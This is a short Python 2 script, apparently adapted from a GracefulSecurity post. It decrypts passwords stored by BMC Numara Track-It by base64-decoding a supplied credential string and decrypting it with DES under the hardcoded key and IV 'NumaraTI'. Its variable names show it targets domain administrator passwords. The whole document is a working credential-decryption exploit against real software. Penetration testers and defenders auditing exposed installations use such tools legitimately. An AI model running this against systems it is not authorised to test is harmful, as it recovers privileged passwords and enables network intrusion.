#ALL CREDIT GOES TO GracefulSecurity!!
##https://www.gracefulsecurity.com/bmcnumara-track-it-decrypt-pass-tool/
import base64
from Crypto.Cipher import DES
DomainAdminPass = raw_input('Enter the base64 cred string for decoding:')
cipher_text = base64.b64decode(DomainAdminPass)
desa = DES.new('NumaraTI', DES.MODE_CBC, 'NumaraTI')
print desa.decrypt(cipher_text)
